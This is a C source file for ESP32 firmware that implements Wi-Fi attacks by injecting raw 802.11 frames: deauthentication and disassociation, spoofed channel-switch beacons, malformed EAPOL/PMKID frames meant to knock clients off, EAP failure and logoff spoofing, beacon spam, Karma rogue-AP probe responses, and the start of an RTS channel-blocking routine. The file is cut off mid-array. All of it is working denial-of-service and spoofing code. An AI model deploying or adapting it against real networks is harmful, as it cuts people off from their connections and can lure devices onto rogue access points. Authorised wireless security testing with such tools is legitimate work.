#include <string.h>
#include <esp_wifi.h>
#include <esp_log.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <freertos/timers.h>
#include <esp_random.h>
#include <lwip/inet.h>
#include <rom/ets_sys.h>
#include "wifi_attacks.h"
#include "libwifi.h"

static const char *TAG = "WIFI_ATTACKS";

void wifi_attack_deauth_basic(const uint8_t dest[6], const uint8_t bssid[6], uint8_t reason_code)
{
    if(bssid == NULL) return;

    uint8_t deauth_packet[26] = {
        0xC0, 0x00, // Frame Control (Deauth)
        0x3A, 0x01, // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Dest Address (Broadcast)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source Address (Placeholder, will be set to BSSID)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (Placeholder, will be set to BSSID)
        0x00, 0x00, // Sequence Control
        0x07, 0x00  // Reason Code (7 = Class 3 frame received from nonassociated station)
    };

    // If not set leave broadcast
    if(dest != NULL)
    {
        memcpy(&deauth_packet[4], dest, 6);    // Destination Address
    }
    memcpy(&deauth_packet[10], bssid, 6);    // Source Address
    memcpy(&deauth_packet[16], bssid, 6);  // BSSID
    deauth_packet[24] = reason_code;       // Reason Code

    /* Send packet */
    esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
}


void wifi_attack_send_disassoc(const uint8_t bssid[6], const uint8_t dest[6], uint8_t reason)
{
    uint8_t packet[26] = {
        0xA0, 0x00,                         // Frame Control (Disassociation)
        0x3A, 0x01,                         // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast or Target)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (BSSID)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
        0x00, 0x00,                         // Sequence
        0x00, 0x00                          // Reason Code
    };

    memcpy(&packet[4], dest, 6);
    memcpy(&packet[10], bssid, 6);
    memcpy(&packet[16], bssid, 6);
    packet[24] = reason; 

    esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
}


void wifi_attack_send_auth_frame(const uint8_t bssid[6], const uint8_t src_mac[6])
{
    uint8_t packet[30] = {
        0xB0, 0x00,                         // Frame Control (Authentication)
        0x3A, 0x01,                         // Duration
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Destination (BSSID)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (Random MAC)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
        0x00, 0x00,                         // Sequence
        0x00, 0x00,                         // Algorithm (Open System)
        0x01, 0x00,                         // Transaction Sequence (1)
        0x00, 0x00                          // Status Code (Success)
    };

    memcpy(&packet[4], bssid, 6);
    memcpy(&packet[10], src_mac, 6);
    memcpy(&packet[16], bssid, 6);

    esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
}


void wifi_attack_send_assoc_req(const uint8_t bssid[6], const uint8_t src_mac[6])
{
    // Association Request minimale
    uint8_t packet[50] = {
        0x00, 0x00,                         // FC (Assoc Req)
        0x3A, 0x01,                         // Duration
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Dest (BSSID)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (Random)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
        0x00, 0x00,                         // Seq
        0x11, 0x00,                         // Capab Info
        0x0A, 0x00,                         // Listen Interval
        // Tags...
        0x00, 0x00,                         // SSID Tag (Empty)
        0x01, 0x01, 0x82                    // Support Rates
    };
    
    memcpy(&packet[4], bssid, 6);
    memcpy(&packet[10], src_mac, 6);
    memcpy(&packet[16], bssid, 6);

    esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
}


void wifi_attack_send_csa_beacon(const uint8_t bssid[6], const uint8_t src_mac[6], uint8_t new_channel)
{
    // Beacon Frame spoofato con CSA IE (Tag 37)
    // Questo dice ai client: "L'AP sta cambiando canale, spostatevi su X!"
    
    uint8_t packet[64] = {
        0x80, 0x00,                         // FC (Beacon)
        0x00, 0x00,                         // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Dest (Broadcast)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (BSSID)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
        0x00, 0x00,                         // Seq
        // Timestamp (8 bytes) dummy
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x64, 0x00,                         // Beacon Interval
        0x11, 0x00,                         // Capab Info
        // Tags
        0x00, 0x00,                         // SSID (Empty/Hidden)
        // CHANNEL SWITCH ANNOUNCEMENT IE (Tag 37)
        0x25, 0x03,                         // Tag 37, Len 3
        0x00,                               // Channel Switch Mode (0=No TX until switch)
        new_channel,                        // New Channel Number
        0x00                                // Channel Switch Count (0 = Immediately)
    };

    memcpy(&packet[10], bssid, 6);
    memcpy(&packet[16], bssid, 6);

    esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
}


void wifi_attack_deauth_client_invalid_PMKID(const uint8_t client[6], const uint8_t bssid[6])
{
    if(client == NULL || bssid == NULL) return;

    static uint64_t replay_counter = 2000;
    uint8_t eapol_packet_invalid_PMKID[91] = {
        0x08, 0x02, // Frame Control (EAPOL)
        0x00, 0x00, // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (Fake Source or BSSID)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
        0x00, 0x00,                         // Sequence Control
        0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, // LLC Header
        0x88, 0x8E,                         // EAPOL Ethertype
        0x02,                               // Key Descriptor Type
        0xCA, 0x00,                         // Key Info (Malformato: Install Flag Settato)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Replay Counter
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Key Nonce
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Key IV
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Key RSC
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Key MIC
        0x00, 0x16, // Key Data Length
        0xDD,       // RSN Tag Number
        0xFF,       // RSN PMKID Tag Length (Corrupted)
        0x00, 0x0F, 0xAC, 0x04, // RSN Information
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00  // PMKID
    };
    memcpy(&eapol_packet_invalid_PMKID[4], client, 6);    // Destination Address (Should be Client MAC)
    memcpy(&eapol_packet_invalid_PMKID[10], bssid, 6);    // Source Address
    memcpy(&eapol_packet_invalid_PMKID[16], bssid, 6);    // BSSID

    for (uint8_t i = 0; i < 8; i++) {
        eapol_packet_invalid_PMKID[35 + i] = (replay_counter >> (56 - i * 8)) & 0xFF;
    }

    esp_wifi_80211_tx(WIFI_IF_STA, eapol_packet_invalid_PMKID, sizeof(eapol_packet_invalid_PMKID), false);
    /* Increase replay counter for next packet */
    replay_counter++;
}


void wifi_attack_deauth_client_bad_msg1(const uint8_t client[6], const uint8_t bssid[6], const wifi_auth_mode_t authmode)
{
    if(client == NULL || bssid == NULL) return;

    static uint64_t replay_counter = 0;
    uint8_t frame_size = 153; // Size of the EAPOL frame
    uint8_t eapol_packet_bad_msg1[153] = {
        0x08, 0x02,//0x02,                         // Frame Control (EAPOL)
        0x00, 0x00,                         // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (BSSID)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
        0x30, 0x00,                         // Sequence Control
        //0x05, 0x00,                         // QoS‑Control
        /* LLC / SNAP */
        0xaa, 0xaa, 0x03, 0x00, 0x00, 0x00,
        0x88, 0x8e,                          // Ethertype = EAPOL
        /* -------- 802.1X Header -------- */
        0x02,                               // Version 802.1X‑2004
        0x03,                               // Type Key
        0x00, 0x75,                          // Length 117 bytes
        /* -------- EAPOL‑Key frame body (117 B) -------- */
        0x02,                               // Desc Type 2 (AES/CCMP)
        0x00, 0xCA,                          // Key Info (Install|Ack…)
        0x00, 0x10,                          // Key Length = 16
        /* Replay Counter (8) */
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01,
        /* Nonce (32) */
        0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
        0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f,
        0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
        0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f,
        /* Key IV (16) */
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        /* Key RSC (8) */
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        /* Key ID  (8) */ 
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        /* Key MIC (16) */ 
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        /* Key Data Len (2) */ 
        0x00, 0x16,
        /* Key Data (22 B) */
        0xDD, 0x14,//0x14,                // Vendor‑specific (PMKID IE)
        0x00, 0x0F, 0xAC, 0x04,      // OUI + Type (PMKID)
        /* PMKID (16 byte zero) */
        0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 
        0x99, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff, 0x11
    };

    memcpy(&eapol_packet_bad_msg1[4], client, 6);    // Destination Address (Client MAC)
    memcpy(&eapol_packet_bad_msg1[10], bssid, 6);    // Source Address
    memcpy(&eapol_packet_bad_msg1[16], bssid, 6);    // BSSID

    /* Generate random Nonce */
    for (uint8_t i = 0; i < 32; i++) {
        eapol_packet_bad_msg1[49 + i] = esp_random() & 0xFF; // Put random values in Key Nonce
    }
    /* Update replay counter */
    for (uint8_t i = 0; i < 8; i++) {
        eapol_packet_bad_msg1[41 + i] = (replay_counter >> (56 - i * 8)) & 0xFF;
    }

    /* Set WPA/WPA2 or WPA3 */
    if(authmode == WIFI_AUTH_WPA3_PSK || authmode == WIFI_AUTH_WPA3_ENTERPRISE || authmode == WIFI_AUTH_WAPI_PSK || authmode == WIFI_AUTH_WPA2_WPA3_PSK) 
    {
        eapol_packet_bad_msg1[35] = 0x5f;      // Length 95 Bytes
        eapol_packet_bad_msg1[38] = 0xcb;//0x8a;//0xCB;      // Key‑Info (LSB)  Install|Ack|Pairwise, ver=3
        eapol_packet_bad_msg1[130] = 0x00; // Key Data Length (LSB) 22 Bytes
        frame_size = frame_size - 22; // Adjust frame size for WPA3
    }

    esp_wifi_80211_tx(WIFI_IF_STA, eapol_packet_bad_msg1, frame_size, false);
    /* Increase replay counter for next packet */
    replay_counter++;
}


void wifi_attack_association_sleep(const uint8_t client[6], const uint8_t bssid[6], const char *ssid)
{
    if(client == NULL || bssid == NULL || ssid == NULL) return;

    static uint16_t sequence_number = 0;
    uint8_t assoc_packet[200] = {
        0x00, 0x10, // Frame Control (Association Request) PM=1
        0x3a, 0x01, // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (Fake Source or BSSID)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
        0x00, 0x00,                         // Sequence Control
        0x31, 0x00,                         // Capability Information (PM=1)
        0x0a, 0x00,                         // Listen Interval
        0x00,                               // SSID tag
        0x00,                               // SSID length      
    };
    memcpy(&assoc_packet[10], client, 6);   // Source Address
    memcpy(&assoc_packet[4],  bssid, 6);    // Destination Address (AP)
    memcpy(&assoc_packet[16], bssid, 6);    // BSSID

    /* Set Sequence Control */
    assoc_packet[23] = (sequence_number >> 8) & 0xFF; // Sequence Number MSB
    assoc_packet[22] = sequence_number & 0xFF;        // Sequence Number LSB

    /* SSID tag */
    assoc_packet[29] = (uint8_t)strlen(ssid); // SSID Length
    memcpy(&assoc_packet[30], ssid, strlen(ssid)); // SSID

    /* Supported Rates tag */
    uint16_t offset = 30 + strlen(ssid); // Offset after SSID);
    assoc_packet[offset++] = 0x01; // Supported Rates tag
    assoc_packet[offset++] = 0x04; // Length
    assoc_packet[offset++] = 0x82;  // 1 Mbps
    assoc_packet[offset++] = 0x04;  // 2 Mbps
    assoc_packet[offset++] = 0x0b;  // 5.5 Mbps
    assoc_packet[offset++] = 0x16;  // 11 Mbps

    /* Power Capability tag */
    assoc_packet[offset++] = 0x21; // Power Capability tag
    assoc_packet[offset++] = 0x02; // Length
    assoc_packet[offset++] = 0x01; // Min Tx Power
    assoc_packet[offset++] = 0x15; // Max Tx Power

    /* Supported Channels tag */
    assoc_packet[offset++] = 0x24; // Supported Channels tag
    assoc_packet[offset++] = 0x02; // Length
    assoc_packet[offset++] = 0x01; // First Channel
    assoc_packet[offset++] = 0x0d; // Last Channel

    /* RSN tag */
    assoc_packet[offset++] = 0x30; // RSN tag
    assoc_packet[offset++] = 0x14; // Length
    assoc_packet[offset++] = 0x01; // Version MSB
    assoc_packet[offset++] = 0x00; // Version LSB
    assoc_packet[offset++] = 0x00; // Group Cipher Suite OUI MSB
    assoc_packet[offset++] = 0x0F; // Group Cipher Suite OUI LSB
    assoc_packet[offset++] = 0xAC; // Group Cipher Suite OUI LSB
    assoc_packet[offset++] = 0x04; // Group Cipher Suite Type (AES-CCMP)
    assoc_packet[offset++] = 0x01; // Pairwise Cipher Suite Count
    assoc_packet[offset++] = 0x00; // Pairwise Cipher Suite Count MSB
    assoc_packet[offset++] = 0x00; // Pairwise Cipher Suite OUI MSB
    assoc_packet[offset++] = 0x0F; // Pairwise Cipher Suite OUI LSB
    assoc_packet[offset++] = 0xAC; // Pairwise Cipher Suite OUI LSB
    assoc_packet[offset++] = 0x04; // Pairwise Cipher Suite Type (AES-CCMP)
    assoc_packet[offset++] = 0x01; // AKM Suite Count
    assoc_packet[offset++] = 0x00; // AKM Suite Count MSB
    assoc_packet[offset++] = 0x00; // AKM Suite OUI MSB
    assoc_packet[offset++] = 0x0f; // AKM Suite OUI MSB
    assoc_packet[offset++] = 0xAC; // AKM Suite OUI LSB
    assoc_packet[offset++] = 0x02; // AKM Suite OUI LSB (WPA2-PSK)
    assoc_packet[offset++] = 0x0c; // RSN Capabilities MSB
    assoc_packet[offset++] = 0x00; // RSN Capabilities LSB

    /* Supported Operating Classes tag */
    assoc_packet[offset++] = 0x3b; // Supported Operating Classes tag
    assoc_packet[offset++] = 0x14; // Length
    assoc_packet[offset++] = 0x51; // Current Operating Class 1 (2.4 GHz)
    /* alternate Operating Class */
    assoc_packet[offset++] = 0x86; // Operating Class 2 (5 GHz)
    assoc_packet[offset++] = 0x85; // Operating Class 3 (6 GHz)
    assoc_packet[offset++] = 0x84; // Operating Class 4 (60 GHz)
    assoc_packet[offset++] = 0x83; // Operating Class 5 (60 GHz)
    assoc_packet[offset++] = 0x81; // Operating Class 6 (60 GHz)
    assoc_packet[offset++] = 0x7f; // Operating Class 7 (60 GHz)
    assoc_packet[offset++] = 0x7e; // Operating Class 8 (60 GHz)
    assoc_packet[offset++] = 0x7d; // Operating Class 9 (60 GHz)
    assoc_packet[offset++] = 0x7c; // Operating Class 10 (60 GHz)
    assoc_packet[offset++] = 0x7b; // Operating Class 11 (60 GHz)
    assoc_packet[offset++] = 0x7a; // Operating Class 12 (60 GHz)
    assoc_packet[offset++] = 0x79; // Operating Class 13 (60 GHz)
    assoc_packet[offset++] = 0x78; // Operating Class 14 (60 GHz)
    assoc_packet[offset++] = 0x77; // Operating Class 15 (60 GHz)
    assoc_packet[offset++] = 0x76; // Operating Class 16 (60 GHz)
    assoc_packet[offset++] = 0x75; // Operating Class 17 (60 GHz)
    assoc_packet[offset++] = 0x74; // Operating Class 18 (60 GHz)
    assoc_packet[offset++] = 0x73; // Operating Class 19 (60 GHz)
    assoc_packet[offset++] = 0x51; // Operating Class 20 (2.4 GHz)

    /* Vendor Specific tag */
    assoc_packet[offset++] = 0xdd; // Vendor Specific tag
    assoc_packet[offset++] = 0x0a; // Length
    assoc_packet[offset++] = 0x00;
    assoc_packet[offset++] = 0x10;
    assoc_packet[offset++] = 0x18;
    assoc_packet[offset++] = 0x02;
    assoc_packet[offset++] = 0x00;
    assoc_packet[offset++] = 0x00;
    assoc_packet[offset++] = 0x10;
    assoc_packet[offset++] = 0x00;
    assoc_packet[offset++] = 0x00;
    assoc_packet[offset++] = 0x02;

    esp_wifi_80211_tx(WIFI_IF_STA, assoc_packet, offset, false);
    sequence_number += 0x10; // Increment sequence number by 16;
}


void wifi_attack_deauth_ap_eapol_logoff(const uint8_t client[6], const uint8_t bssid[6])
{
    if(client == NULL || bssid == NULL) return;

    uint8_t eapol_logoff_packet[38] = {
        0x88, 0x11, // Frame Control (EAPOL)
        0x00, 0x00, // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (Fake Source or BSSID)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
        0x00, 0x00,                         // Sequence Control
        0x05, 0x00,                         // QoS‑Control
        0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, // LLC Header
        0x88, 0x8E,                         // EAPOL Ethertype
        0x02,                               // EAP Version
        0x02,                               // EAPOL-Type (Logoff)
        0x00, 0x00                          // EAPOL Length
    };
    memcpy(&eapol_logoff_packet[10], client, 6);    // Source Address
    memcpy(&eapol_logoff_packet[4], bssid, 6);      // Destination Address (AP)
    memcpy(&eapol_logoff_packet[16], bssid, 6);     // BSSID

    esp_wifi_80211_tx(WIFI_IF_STA, eapol_logoff_packet, sizeof(eapol_logoff_packet), false);
}


void wifi_attack_deauth_client_eap_failure(const uint8_t client[6], const uint8_t bssid[6])
{
    if(client == NULL || bssid == NULL) return;

    uint8_t eap_failure_packet[42] = {
        0x08, 0x02, // Frame Control (EAPOL)
        0x00, 0x00, // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast or Client MAC)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (Fake Source or BSSID)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
        0x00, 0x00,                         // Sequence Control
        0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, // LLC Header
        0x88, 0x8E,                         // EAPOL Ethertype
        0x00, 0x00, 0x00, 0x00,             // EAPOL Packet Length
        0x01,                               // EAP Version
        0x04,                               // EAPOL Type (EAP Failure)
        0x00, 0x04,                         // EAP Length
        0x02,                               // EAP ID
        0x04                                // EAP Code (Failure)
    };
    memcpy(&eap_failure_packet[4], client, 6);    // Destination Address (Client MAC)
    memcpy(&eap_failure_packet[10], bssid, 6);    // Source Address
    memcpy(&eap_failure_packet[16], bssid, 6);    // BSSID

    esp_wifi_80211_tx(WIFI_IF_STA, eap_failure_packet, sizeof(eap_failure_packet), false);
}


void wifi_attack_deauth_client_eap_rounds(const uint8_t client[6], const uint8_t bssid[6])
{
    if(client == NULL || bssid == NULL) return;

    uint8_t eap_identity_request_packet[42] = {
        0x08, 0x02, // Frame Control (EAPOL)
        0x00, 0x00, // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast or Client MAC)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (Fake Source or BSSID)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
        0x00, 0x00,                         // Sequence Control
        0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, // LLC Header
        0x88, 0x8E,                         // EAPOL Ethertype
        0x00, 0x00, 0x00, 0x05,             // EAPOL Packet Length
        0x01,                               // EAP Version
        0x01,                               // EAP Code (Request)
        0x01,                               // EAP ID
        0x00, 0x05,                         // EAP Length
        0x01                                // EAP Type (Identity)
    };
    memcpy(&eap_identity_request_packet[4], client, 6);    // Destination Address (Client MAC) 
    memcpy(&eap_identity_request_packet[10], bssid, 6);    // Source Address
    memcpy(&eap_identity_request_packet[16], bssid, 6);    // BSSID
    
    for(uint8_t identity = 0; identity < 255; identity++ )
    {
        eap_identity_request_packet[38] = identity;
        esp_wifi_80211_tx(WIFI_IF_STA, eap_identity_request_packet, sizeof(eap_identity_request_packet), false);
        vTaskDelay(5);
    }
}


void wifi_attack_deauth_ap_eapol_start(const uint8_t client[6], const uint8_t bssid[6])
{
    if(client == NULL || bssid == NULL) return;

    uint8_t eapol_start_packet[36] = {
        0x08, 0x02, // Frame Control (EAPOL)
        0x00, 0x00, // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast or Client MAC)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (Fake Source or BSSID)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
        0x00, 0x00,                         // Sequence Control
        0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, // LLC Header
        0x88, 0x8E,                         // EAPOL Ethertype
        0x01, 0x01,                         // EAPOL Version and Type (Start)
        0x00, 0x00                          // EAPOL Length (0 for Start packets)
    };
    memcpy(&eapol_start_packet[4], client, 6);    // Destination Address (Client MAC) 
    memcpy(&eapol_start_packet[10], bssid, 6);    // Source Address
    memcpy(&eapol_start_packet[16], bssid, 6);    // BSSID

    for(uint8_t burst = 0; burst < 3; burst++ )
    {
        esp_wifi_80211_tx(WIFI_IF_STA, eapol_start_packet, sizeof(eapol_start_packet), false);
        vTaskDelay(5);
    }
}


void wifi_attack_deauth_client_negative_tx_power(const uint8_t bssid[6], uint8_t channel, const char *ssid)
{
    if(ssid == NULL || bssid == NULL) return;

    uint8_t beacon_frame_negative_tx[256] = {
        0x80, 0x00, // Frame Control (Beacon)
        0x00, 0x00, // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (Fake Source or BSSID)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
        0x00, 0x00, // Sequence Control
        0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // timestamp
        0x64, 0x00, // Beacon Interval (102.4ms)
        0x31, 0x04  // Capability Information
    };
    memcpy(&beacon_frame_negative_tx[10], bssid, 6);    // Source Address
    memcpy(&beacon_frame_negative_tx[16], bssid, 6);    // BSSID 
    uint16_t offset = 36;
    // 2. Tagged Parameters
    // SSID Parameter
    beacon_frame_negative_tx[offset++] = 0x00;          // SSID Tag Number
    beacon_frame_negative_tx[offset++] = strlen(ssid);  // SSID Tag Length
    memcpy(beacon_frame_negative_tx + offset, ssid, strlen(ssid));
    offset += strlen(ssid);

    /* Supported Rates (1 Mbps, 2 Mbps, 5.5 Mbps, 11 Mbps) */
    beacon_frame_negative_tx[offset++] = 0x01;          // Supported Rates Tag Number
    beacon_frame_negative_tx[offset++] = 3;             // Length
    beacon_frame_negative_tx[offset++] = 0x82;          // 1 Mbps
    beacon_frame_negative_tx[offset++] = 0x84;          // 2 Mbps
    beacon_frame_negative_tx[offset++] = 0x8B;          // 5.5 Mbps
    //beacon_frame_negative_tx[offset++] = 0x16;        // 11 Mbps

    // DS Parameter Set (Channel)
    beacon_frame_negative_tx[offset++] = 0x03;          // DS Parameter Set Tag Number
    beacon_frame_negative_tx[offset++] = 1;             // Length
    beacon_frame_negative_tx[offset++] = channel;       // Channel Number

    // Traffic Indication Map (TIM)
    beacon_frame_negative_tx[offset++] = 0x05;          // TIM Tag Number
    beacon_frame_negative_tx[offset++] = 4;             // Length
    beacon_frame_negative_tx[offset++] = 0x00;          // DTIM Count
    beacon_frame_negative_tx[offset++] = 0x01;          // DTIM Period
    beacon_frame_negative_tx[offset++] = 0x00;          // Bitmap Control
    beacon_frame_negative_tx[offset++] = 0x00;          // Partial Virtual Bitmap

    // // RSN Information (WPA2)
    // uint8_t rsn_info[] = {
    //     0x30,                         // RSN Information Tag Number
    //     0x18,                         // Length
    //     0x01, 0x00,                   // Version
    //     0x00, 0x0F, 0xAC, 0x04,       // Group Cipher Suite (CCMP)
    //     0x01, 0x00,                   // Pairwise Cipher Suite Count
    //     0x00, 0x0F, 0xAC, 0x04,       // Pairwise Cipher Suite (CCMP)
    //     0x01, 0x00,                   // Authentication Suite Count
    //     0x00, 0x0F, 0xAC, 0x02,       // Authentication Suite (PSK)
    //     0x00, 0x00                    // RSN Capabilities
    // };
    // memcpy(beacon_frame_negative_tx + offset, rsn_info, sizeof(rsn_info));
    // offset += sizeof(rsn_info);

    // TCP Report Transmission Power (TX Power Level)
    beacon_frame_negative_tx[offset++] = 0x33;          // TCP Report TX Power Tag Number
    beacon_frame_negative_tx[offset++] = 1;             // Length
    beacon_frame_negative_tx[offset++] = 15;            // TX Power Level

    // Power Constraint
    beacon_frame_negative_tx[offset++] = 0x20;          // Power Constraint Tag Number
    beacon_frame_negative_tx[offset++] = 1;             // Length
    beacon_frame_negative_tx[offset++] = -1;            // Power Constraint (Example: 3 dBm)

    /* Spam 10 packets */
    for (uint8_t i = 0; i <= 9; i++) 
    {
        esp_wifi_80211_tx(WIFI_IF_STA, beacon_frame_negative_tx, offset, false);
        vTaskDelay(pdMS_TO_TICKS(5));
    }
}


void wifi_attack_softap_beacon_spam(const char *ssid, uint8_t channel)
{
    if(ssid == NULL) return;

    uint8_t mac[6] = { 0 };
    uint8_t beacon_frame[256] = {
        0x80, 0x00, // Frame Control (Beacon)
        0x00, 0x00, // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (Fake Source or BSSID)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
        0x00, 0x00, // Sequence Control
        0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // timestamp
        0x64, 0x00, // Beacon Interval (102.4ms)
        0x21, 0x00,  // Capability Information
        0x00, 0x00  // SSID Tag Number and Length (Placeholder, will be set later)
    };
    // Time stamp
    uint64_t timestamp = xTaskGetTickCount() / 1000; // Convert micro
    timestamp = (timestamp << 32) | (timestamp & 0xFFFFFFFF);
    memcpy(&beacon_frame[24], &timestamp, 8); // Set timestamp in beacon frame

    // Set SSID
    beacon_frame[36] = 0x00; // SSID Tag Number
    beacon_frame[37] = (uint8_t)strlen(ssid);
    esp_wifi_get_mac(ESP_IF_WIFI_AP, mac);
    memcpy(&beacon_frame[10], mac, 6);    // Source Address
    memcpy(&beacon_frame[16], mac, 6);    // BSSID 
    memcpy(&beacon_frame[38], ssid, strlen(ssid)); // SSID
    uint16_t offset = 38 + strlen(ssid);

    // 2. Tagged Parameters
    // Supported Rates (1 Mbps, 2 Mbps, 5.5 Mbps, 11 Mbps)
    beacon_frame[offset++] = 0x01;          // Supported Rates Tag Number
    beacon_frame[offset++] = 0x08;             // Length
    beacon_frame[offset++] = 0x82;          // 1 Mbps
    beacon_frame[offset++] = 0x84;          // 2 Mbps
    beacon_frame[offset++] = 0x8B;          // 5.5 Mbps
    beacon_frame[offset++] = 0x96;          // 11 Mbps
    beacon_frame[offset++] = 0x0C;          // 6 Mbps
    beacon_frame[offset++] = 0x12;          // 9 Mbps
    beacon_frame[offset++] = 0x18;          // 12 Mbps
    beacon_frame[offset++] = 0x24;          // 18 Mbps

    // DS Parameter Set (Channel)
    beacon_frame[offset++] = 0x03;          // DS Parameter Set Tag Number
    beacon_frame[offset++] = 0x01;             // Length
    beacon_frame[offset++] = channel;       // Channel Number

    /* Spam 10 packets */
    for (uint8_t i = 0; i <= 9; i++) 
    {
        esp_wifi_80211_tx(WIFI_IF_STA, beacon_frame, offset, false);
        vTaskDelay(pdMS_TO_TICKS(5));
    }
}


void wifi_attack_send_karma_probe_response(const uint8_t *victim_mac, const char *requested_ssid, uint8_t channel)
{
    uint8_t my_mac[6];
    esp_wifi_get_mac(WIFI_IF_AP, my_mac);

    struct libwifi_probe_resp probe_resp_logic = {0};
    int ret_create = libwifi_create_probe_resp(&probe_resp_logic, victim_mac, my_mac, my_mac, requested_ssid, channel);

    if (ret_create != 0) {
        ESP_LOGE("KARMA", "Errore creazione struct probe response");
        return;
    }

    uint8_t buffer[512];
    size_t frame_len = libwifi_dump_probe_resp(&probe_resp_logic, buffer, sizeof(buffer));
    if (frame_len == 0) {
        ESP_LOGE("KARMA", "Errore dump probe response");
        libwifi_free_probe_resp(&probe_resp_logic);
        return;
    }
    
    /* Spam 10 packets */
    for (uint8_t i = 0; i <= 9; i++) 
    {
        esp_wifi_80211_tx(WIFI_IF_AP, buffer, frame_len, false);
        vTaskDelay(pdMS_TO_TICKS(5));
    }

    libwifi_free_probe_resp(&probe_resp_logic);
}


void wifi_attack_nav_abuse(const uint8_t bssid[6])
{
    if (bssid == NULL) return;

    // Frame RTS (Request to Send) - Type Control (0x1), Subtype RTS (0xB) -> 0xB4
    // Duration: 32767 microsecondi (0x7FFF) - Il massimo valore per bloccare il canale
    uint8_t rts_packet[20] = {
